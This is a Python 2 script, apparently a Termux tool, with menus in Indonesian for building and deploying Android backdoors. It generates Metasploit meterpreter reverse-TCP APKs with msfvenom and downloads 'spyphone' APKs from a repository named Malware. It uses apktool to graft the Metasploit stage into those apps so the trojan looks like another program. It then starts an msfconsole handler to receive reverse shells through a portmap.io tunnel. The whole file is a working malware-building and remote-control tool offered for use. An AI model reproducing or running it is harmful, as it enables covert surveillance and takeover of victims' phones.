# -*- coding: utf-8 -*-


import os
import time
import itertools
import threading
import sys



putih="\x1b[1;97m"
merah="\x1b[1;91m"
hijau="\x1b[1;92m" 
red= '\033[91m'
orange= '\33[38;5;208m'
green= '\033[92m'
cyan= '\033[36m'
bold= '\033[1m'
end= '\033[0m'


def out():
	os.system("exit")

os.system("clear")
confirm =raw_input(putih+'Sudah mempunyai akun Portmap.io? y/n : ')
if confirm== 'y':
  os.system('clear')  
else :
  if confirm== 'n':
    print '' 
    print 'buat akun portmap.io dulu'
    print '' 
    os.system('termux-open https://portmap.io')
    time.sleep(1)
    out()
  else :
    if confirm== ' ':
      os.system('python2 msfgaf.py')
    else :
      os.system('python2 msfgaf.py')
      
confirm=raw_input('sudah Aktifkan OpenVPN?  y/n : ')
if confirm== '' :
	os.system('python2 msfgaf.py')
else :
	if confirm== 'y' :
		print ' '
	else :
		if confirm== 'n' :
			os.system('clear')
			print 'anda harus mengaktifkan OpenVPN untuk melanjutkan'
			time.sleep(2)
			os.system('am start --user 0 -n net.openvpn.openvpn/net.openvpn.unified.MainActivity')
		else :
			print 'Konfirmasi Salah!'
			time.sleep(4)
			os.system('clear')
			out()
      



def payload():
	os.system("clear")
	logo()
	print "\x1b[1;97mAmbil \x1b[1;91m5 Digit angka \x1b[1;97mSetelah TAnda (:)"
	print "Contoh Menggunakan Config Saya"
	print "tcp://gafar97port-53967.portmap.io:\x1b[1;91m53967"
	print "                                     \x1b[1;91m^"
	print "----------------------------------------------"
	lp=raw_input("Port : ")
	if lp== ' ' :
		print 'Harus Diisi'
		payload()
	else :
		print ' '
	print "\x1b[1;97mMasukan LHOST"
	print "Contoh Menggunakan Config Saya"
	print "\x1b[1;91mgafar97port-53967.portmap.io"
	print "\x1b[1;91m                 ^"
	print "----------------------------------------------"
	lh=raw_input("lhost : ")
	if lh== ' ' :
		print 'Harus Diisi'
	else :
		print ' '
	print hijau+'PLEASE WAIT ...'
	os.system("msfvenom -p android/meterpreter/reverse_tcp lhost="+str(lh)+" lport="+str(lp)+" -o Malware/payload.apk")
	
def spyphone_V14():
	os.system("wget http://github.com/PyRAT-svg/Malware/raw/master/spyphone_V14.apk && mv -f spyphone_V14.apk Malware/spyphone.apk")
	os.system("cd Malware && rm -rf payload.apk payload spyphone")
	os.system("cd Malware && apktool d spyphone.apk -o spyphone")
	os.system("rm -rf Malware/spyphone.apk")
	payload()
	os.system("cd Malware && apktool d payload.apk -o payload")
	os.system("rm -rf Malware/spyphone/smali/com/metasploit/stage")
	os.system("mv -f Malware/payload/smali/com/metasploit/stage Malware/spyphone/smali/com/metasploit")
	os.system("cd Malware && apktool b spyphone -o spyphone_V14.apk")
	os.system("cd Malware && rm -rf payload.apk payload spyphone")
	os.system('am start --user 0 -n com.haibison.apksigner/app.activities.MainActivity')
	os.system('mv -f Malware/spyphone_V14.apk /storage/emulated/0/')
		

	
def spyphone():
	os.system("wget http://github.com/PyRAT-svg/Malware/raw/master/spyphone.apk -o && mv -f spyphone.apk Malware/spyphone.apk")
	os.system("cd Malware && rm -rf payload.apk payload spyphone")
	os.system("cd Malware && apktool d spyphone.apk -o spyphone")
	os.system("rm -rf Malware/spyphone.apk")
	payload()
	os.system("cd Malware && apktool d payload.apk -o payload && cd ")
	os.system("rm -rf Malware/spyphone/smali/com/metasploit/stage")
	os.system("mv -f Malware/payload/smali/com/metasploit/stage Malware/spyphone/smali/com/metasploit")
	os.system("cd Malware && apktool b spyphone -o spyphone.apk")
	os.system("cd Malware && rm -rf payload.apk payload spyphone")
	os.system('am start --user 0 -n com.haibison.apksigner/app.activities.MainActivity')
	os.system('mv -f Malware/spyphone.apk /storage/emulated/0/')
		
	
def awal():
	malware()
	pilmal()
	
def pilmal():
    zedd = raw_input('╚═\x1b[1;91m▶\x1b[1;97m ')
    if zedd == '':
    	os.system('clear')
        home()
    else:
        if zedd == '1':
            spyphone()
        else:
            if zedd == '2':
                spyphone_V14()
            else:
            	print '\x1b[1;91m[!] Pilih 1-2'
            	os.system('clear')
            	awal()
            

def malware():
    os.system('clear')
    logo()
    os.system('figlet Malware |lolcat')
    print '\x1b[1;91m1.\x1b[1;97mSpyphone'
    print '\x1b[1;91m2.\x1b[1;97mSpyphone_V14'
    print '\r\x1b[1;91m__________________________________________«Back» '
    
        	


def logo():      
	print "\n \x1b[1;92m \n \x1b[1;97m╔════════════════════════════════════════════════╗\n \x1b[1;97m║ \x1b[1;91m                 PERINGATAN    \x1b[1;96m\x1b[1;97m                ║\n \x1b[1;97m║\x1b[1;91m    Kami Tidak Bertanggung Jawab Atas Segala   \x1b[  \x1b[1;97m ║\n \x1b[1;97m║\x1b[1;91m       Pelanggaran HUKUM Yang Anda lakukan   \x1b[  \x1b[1;97m   ║   \n \x1b[1;97m╚════════════════════════════════════════════════╝"  '\n'
	print '---------------------------------------------------'
	print cyan+' Author  : '+green+'Gafar Risky {PyRAT-svg}   '
	print cyan+' Github  : '+green+'http://github.com/PyRAT-svg/msfgaf '
	print cyan+' Youtube : '+green+'Gafar Risky                     '
	print putih+'---------------------------------------------------'
	print ''


def remote():
    os.system("clear")    	
    logo()
    print (''+putih)
    os.system('ifconfig')
    print ('')
    print (merah+'___________________«»')
    
    print putih+"IP Local Mu"
    print "\x1b[1;91m----------------------------------------------"
    print " pastekan IP Tun0 inet disini"
    lh =raw_input(" LHOST : ")
    os.system("clear")
    if lh== '':
      logo()
      print merah+"[!] Harus DiIsi"
      time.sleep(1)
      os.system("clear")
      remote()
    else :
      os.system("clear")
    
    os.system("clear")
    logo()
    print "\x1b[1;97mMasukan LPORT"
    print "contoh"
    print "tcp://gafar97port-53967.portmap.io:53967=>\x1b[1;91m8080"
    print "\x1b[1;91m                                            ^"
    print "----------------------------------------------"
    lp =raw_input("LPORT : ")
    os.system("clear")
    
    if lp== '':
      print "[!]Harus DiIsi"
      time.sleep(1)
      os.system("clear")
      remote()
    else :
      os.system("clear")
      os.system("msfconsole -x 'use exploit/multi/handler;set payload android/meterpreter/reverse_tcp;set LHOST "+str(lh)+";set LPORT "+str(lp)+";exploit;'");
      raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
      home() 


    
def sisip():
    awal() 
    time.sleep(3)
    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
    home() 
    
    
def update():
	os.system('clear')
	os.system('git stash && git pull origin master')
	os.system('python2 install.py')
	raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
	home()
    
	
    
def baru():
    os.system('clear')
    logo()
    name=raw_input("Name : ")  
    print "\x1b[1;97mAmbil \x1b[1;91m5 Digit angka \x1b[1;97mSetelah TAnda (:)"
    print "Contoh Menggunakan Config Saya"
    print "tcp://gafar97port-53967.portmap.io:\x1b[1;91m53967" 
    print "                                     \x1b[1;91m^"
    print "----------------------------------------------"
    port=raw_input("Port : ") 
    print "\x1b[1;97mMasukan LHOST"
    print "Contoh Menggunakan Config Saya"
    print "\x1b[1;91mgafar97port-53967.portmap.io" 
    print "\x1b[1;91m                 ^"
    print "----------------------------------------------"
    lh=raw_input("lhost : ")
    os.system('clear')
    print hijau+"[*] GENERATE BACKDOOR \n"
    os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST="+lh+" LPORT="+port+" -o "+name+".apk")
    time.sleep(4)
    os.system('mv '+str(name)+'.apk /storage/emulated/0/')
    time.sleep(4)
    os.system('am start --user 0 -n com.haibison.apksigner/app.activities.MainActivity')
    home()
  
    
def menu():
    os.system('clear')
    time.sleep(1)
    logo()
    print '\x1b[1;91m1.\x1b[1;97mSisipkan Bacdoor '
    print '\x1b[1;91m2.\x1b[1;97mBuat Backdoor Baru        '
    print '\x1b[1;91m3.\x1b[1;97mEsekusi'
    print '\x1b[1;91m4.\x1b[1;97mUpdate--'
    print '\x1b[1;91m5.\x1b[1;97mExit'
    print '\r\x1b[1;91m__________________________________________«» '
 
menu();

def pilih():
    zedd = raw_input('╚═\x1b[1;91m▶\x1b[1;97m ')
    if zedd == '':
        print '\x1b[1;91m[!] Can\'t empty'
        time.sleep(1)
        os.system('clear')
        menu()
        pilih()
    else:
        if zedd == '1':
            sisip()
        else:
            if zedd == '2':
                baru()
            else:
              if zedd == '3':
                remote()
              else:
				  if zedd == '4':
					  update()
				  else:	
					 if zedd == '5':
						  exit()
					 else:					
					  print '\x1b[1;91m[!] Pilih 1,2,3'
					  os.system('clear')
					  home()
					  
                
        
def home():
	menu()
	pilih()         
                   
        

pilih();
    
